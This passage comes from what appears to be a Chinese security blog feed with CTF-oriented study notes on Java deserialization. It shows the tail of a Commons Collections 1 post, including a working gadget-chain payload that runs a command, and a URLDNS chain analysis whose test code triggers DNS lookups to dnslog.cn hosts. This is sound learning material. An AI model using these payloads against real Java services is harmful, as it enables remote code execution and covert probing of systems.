class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Map</span>        Map map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map map1 <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//</span>        Class <span class="token class-name">cls</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor ct <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ct<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//</span>        InvocationHandler handler <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> ct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Target<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> map1<span class="token punctuation">)</span><span class="token punctuation">;</span>        Map proxyMap <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object o <span class="token operator">=</span> ct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Target<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> proxyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//payload序列化</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://kingofkb.github.io/medias/image/20220721/calc7.png"><br>成功调出。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>到动调那块已经基本晕了，等完了看看后面的链加深理解后再回来看看，或者结合一些题目来看。等完了填坑吧。</p><p>参考链接：<br><a href="https://silente.top/posts/Java-CC%E9%93%BE1-%E5%AD%A6%E4%B9%A0/">Java CC链1 学习</a><br><a href="https://www.cnblogs.com/kingbridge/articles/16141397.html">Java反序列化学习–从URLDNS到CommonsCollections1-7</a><br><a href="https://blog.csdn.net/weixin_45808483/article/details/122743960">Java安全入门(二)——CC链1 分析+详解</a><br><a href="https://blog.csdn.net/xd_2021/article/details/121962921">Java反序列化之CC1链分析</a><br><a href="https://blog.csdn.net/weixin_43889136/article/details/124135578">Java安全研究——反序列化漏洞之CC链</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化初探URLDNS</title>
      <link href="/2022/07/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2URLDNS/"/>
      <url>/2022/07/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2URLDNS/</url>
      
        <content type="html"><![CDATA[<h1 id="Java反序列化初探URLDNS"><a href="#Java反序列化初探URLDNS" class="headerlink" title="Java反序列化初探URLDNS"></a>Java反序列化初探URLDNS</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近碰见很多java类型题目，但经常感觉无从下手，有时看着WP复现都感觉很吃力，所以打算从基础出发去学习。打算先从最简单的URLDNS学起，之后再学习CC链。<br>参考了大佬们的博客<br><a href="https://www.cnblogs.com/Mikasa-Ackerman/p/Yso-zhong-deURLDNS-fen-xi-xue-xi.html">Yso中的URLDNS分析学习</a><br><a href="https://blog.csdn.net/rfrder/article/details/119678492">URLDNS链学习</a><br><a href="https://www.cnblogs.com/kingbridge/articles/16141397.html">Java反序列化从URLDNS到CommonsCollections1-7</a><br><a href="https://silente.top/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/">Java 反序列化初探</a></p><p><a href="https://blog.csdn.net/gao_zhennan/article/details/123828322">Java反射的setAccessible()方法</a></p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>是<a href="https://github.com/frohoff/ysoserial">ysonserial</a>中一个利用链，其触发的结果是一次DNS请求，可用于确认是否存在反序列化漏洞。<br>翻开ysonserial的源码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token keyword">final</span> String url<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Avoid DNS resolution during payload creation</span>    <span class="token comment" spellcheck="true">//Since the field &lt;code>java.net.URL.handler&lt;/code> is transient, it will not be part of the serialized payload.</span>    URLStreamHandler handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SilentURLStreamHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    HashMap ht <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// HashMap that will contain the URL</span>    URL u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span> url<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// URL to use as the Key</span>    ht<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span>    Reflections<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> <span class="token string">"hashCode"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span>    <span class="token keyword">return</span> ht<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>调用链如下：</p><pre class=" language-1"><code class="language-1">Gadget Chain:HashMap.readObject()HashMap.putVal()HashMap.hash()URL.hashCode()</code></pre><p><strong>网上找到的分析大多基JDK1.8，而本机JDK版本为17，以下分析过程有些许不同，主要是URLStreamHandler handler中的getHostAdress部分，其他的基本相同。</strong><br>找到反序列化的入口类，readobject。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>    <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span>    s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">reinitialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>loadFactor <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> Float<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>loadFactor<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Illegal load factor: "</span> <span class="token operator">+</span> loadFactor<span class="token punctuation">)</span><span class="token punctuation">;</span>    s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Read and ignore number of buckets</span>    <span class="token keyword">int</span> mappings <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Read number of mappings (size)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>mappings <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Illegal mappings count: "</span> <span class="token operator">+</span> mappings<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>mappings <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// (if zero, use defaults)</span>        <span class="token comment" spellcheck="true">// Size the table using given load factor only if within</span>        <span class="token comment" spellcheck="true">// range of 0.25...4.0</span>        <span class="token keyword">float</span> lf <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token number">0.25f</span><span class="token punctuation">,</span> loadFactor<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4.0f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">float</span> fc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>mappings <span class="token operator">/</span> lf <span class="token operator">+</span> <span class="token number">1.0f</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> cap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fc <span class="token operator">&lt;</span> DEFAULT_INITIAL_CAPACITY<span class="token punctuation">)</span> <span class="token operator">?</span>                   DEFAULT_INITIAL_CAPACITY <span class="token operator">:</span>                   <span class="token punctuation">(</span>fc <span class="token operator">>=</span> MAXIMUM_CAPACITY<span class="token punctuation">)</span> <span class="token operator">?</span>                   MAXIMUM_CAPACITY <span class="token operator">:</span>                   <span class="token function">tableSizeFor</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>fc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">float</span> ft <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>cap <span class="token operator">*</span> lf<span class="token punctuation">;</span>        threshold <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>cap <span class="token operator">&lt;</span> MAXIMUM_CAPACITY <span class="token operator">&amp;&amp;</span> ft <span class="token operator">&lt;</span> MAXIMUM_CAPACITY<span class="token punctuation">)</span> <span class="token operator">?</span>                     <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ft <span class="token operator">:</span> Integer<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Check Map.Entry[].class since it's the nearest public type to</span>        <span class="token comment" spellcheck="true">// what we're actually creating.</span>        SharedSecrets<span class="token punctuation">.</span><span class="token function">getJavaObjectInputStreamAccess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">checkArray</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> Map<span class="token punctuation">.</span>Entry<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> cap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"rawtypes"</span><span class="token punctuation">,</span><span class="token string">"unchecked"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        Node<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span> tab <span class="token operator">=</span> <span class="token punctuation">(</span>Node<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">[</span>cap<span class="token punctuation">]</span><span class="token punctuation">;</span>        table <span class="token operator">=</span> tab<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Read the keys and values, and put the mappings in the HashMap</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> mappings<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>                K key <span class="token operator">=</span> <span class="token punctuation">(</span>K<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>                V value <span class="token operator">=</span> <span class="token punctuation">(</span>V<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>发现其在最后调用了hash函数，跟进</p><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">hash</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> h<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token punctuation">(</span>h <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>发现调用了key.hashCode，查看源码发现这个key是URL类。<br>跟进URL类的hashcode方法</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hashCode <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>    hashCode <span class="token operator">=</span> handler<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进hashcode发现</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">int</span> hashCode <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span></code></pre><p>跟进一下handler</p><pre class=" language-java"><code class="language-java"><span class="token keyword">transient</span> URLStreamHandler handler<span class="token punctuation">;</span></code></pre><p>发现有URLStreamHandler，找URLStreamHandler下的hashcode函数</p><pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span>URL u<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> h <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Generate the protocol part.</span>    String protocol <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">getProtocol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>protocol <span class="token operator">!=</span> null<span class="token punctuation">)</span>        h <span class="token operator">+=</span> protocol<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Generate the host part.</span>   InetAddress addr <span class="token operator">=</span> <span class="token function">getHostAddress</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>addr <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        h <span class="token operator">+=</span> addr<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        String host <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>host <span class="token operator">!=</span> null<span class="token punctuation">)</span>            h <span class="token operator">+=</span> host<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Generate the file part.</span>    String file <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">getFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">!=</span> null<span class="token punctuation">)</span>        h <span class="token operator">+=</span> file<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Generate the port part.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>u<span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        h <span class="token operator">+=</span> <span class="token function">getDefaultPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        h <span class="token operator">+=</span> u<span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Generate the ref part.</span>    String ref <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">getRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ref <span class="token operator">!=</span> null<span class="token punctuation">)</span>        h <span class="token operator">+=</span> ref<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> h<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进getHostAddress</p><pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> InetAddress <span class="token function">getHostAddress</span><span class="token punctuation">(</span>URL u<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> u<span class="token punctuation">.</span><span class="token function">getHostAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进URL类下的getHostAddress</p><pre class=" language-java"><code class="language-java"><span class="token keyword">synchronized</span> InetAddress <span class="token function">getHostAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hostAddress <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> hostAddress<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>host <span class="token operator">==</span> null <span class="token operator">||</span> host<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        hostAddress <span class="token operator">=</span> InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnknownHostException</span> <span class="token operator">|</span> SecurityException ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> hostAddress<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>其中InetAddress.getByName(host)的作用为根据主机名获取ip地址，即一次DNS查询。<br>这样就得到了Gadget</p><pre class=" language-1"><code class="language-1">HashMap.readObject()HashMap.hash()URL.hashCode()URLStreamHandler.hashCode()URLStreamHandler.getHostAddress()URL.getHostAddress()InetAddress.getByName()</code></pre><p>想要触发hash的调用，首先要用到putval，而我们发现put函数下就有putval的调用，这意味着，只要进行一次简单的put，都会触发一次URLDNS。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> V <span class="token function">put</span><span class="token punctuation">(</span>K key<span class="token punctuation">,</span> V value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>再查看ysoserial的URLDNS链，发现其多了一个SilentURLStreamHandler。根据调用链，在后面会调用handler的getHostAddress方法。为了不让在put的时候就触发了URLDNS，Ysoserial自己写了一个类继承URLStreamHandler，然后重写了getHostAddress()方法，防止了URLDNS链在每一次put的时候都会触发。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">SilentURLStreamHandler</span> <span class="token keyword">extends</span> <span class="token class-name">URLStreamHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> URLConnection <span class="token function">openConnection</span><span class="token punctuation">(</span>URL u<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">synchronized</span> InetAddress <span class="token function">getHostAddress</span><span class="token punctuation">(</span>URL u<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>考虑到调用put()，虽然没有触发URLDNS，但是同样调用了hash()，换言之，生成payload的时候也应该会产生大量的请求。测试一下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">urldns</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        HashMap test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://8bv0ev.dnslog.cn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        test<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token number">233</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://kingofkb.github.io/medias/image/20220717/getrequest.png"><br>确实产生了请求。<br>而hash的调用也导致了传入的URL类对象的哈希值被计算了一次，hashCode不再是-1了，因此还需要再修改它的hashCode属性。但是注意这个属性是private，因此只能用反射的方式将其改为-1。<br>即，如果想要通过反序列化的方式触发，就需要将hashCode的值改为-1，这样不会因为生成poc而造成DNS请求。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">urldns</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        HashMap test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://0cz0kq.dnslog.cn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field justhash <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token 